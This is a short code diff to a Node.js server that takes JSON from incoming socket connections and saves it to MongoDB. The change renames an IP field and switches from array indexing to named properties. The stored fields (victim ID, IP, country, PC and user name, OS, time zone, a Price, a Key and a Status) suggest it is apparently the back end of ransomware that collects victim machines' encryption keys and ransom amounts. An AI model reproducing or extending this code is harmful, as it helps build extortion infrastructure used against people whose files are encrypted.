@@ -15,7 +15,7 @@ mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true
 const userScheme = new Schema({
 
     ID: String,
-    IPAddress: String,
+    IP: String,
     Country: String,
     Flag: String,
     PC: String,
@@ -33,24 +33,24 @@ const Users = mongoose.model("Users", userScheme);
 
 server.on('connection', function (socket) {
 
-	socket.on('data', function (data) {
+    socket.on('data', function (data) {
 
-        dataUser = JSON.parse(data.toString('utf8'));
+        var dataUser = JSON.parse(data.toString("utf8"))
 
         const User = new Users({
 
-            ID: dataUser[0],
-            IPAddress: dataUser[1],
-            Country: dataUser[2],
-            Flag: dataUser[3],
-            PC: dataUser[4],
-            User: dataUser[5],
-            OS: dataUser[6],
-            TimeZone: dataUser[7],
-            DateTime: dataUser[8],
-            Price: dataUser[9],
-            Key: dataUser[10],
-            Status: dataUser[11]
+            ID: dataUser.ID,
+            IP: dataUser.IP,
+            Country: dataUser.Country,
+            Flag: dataUser.Flag,
+            PC: dataUser.PC,
+            User: dataUser.User,
+            OS: dataUser.OS,
+            TimeZone: dataUser.TimeZone,
+            DateTime: dataUser.DateTime,
+            Price: dataUser.Price,
+            Key: dataUser.Key,
+            Status: dataUser.Status
         });
 
         User.save(function (err) {
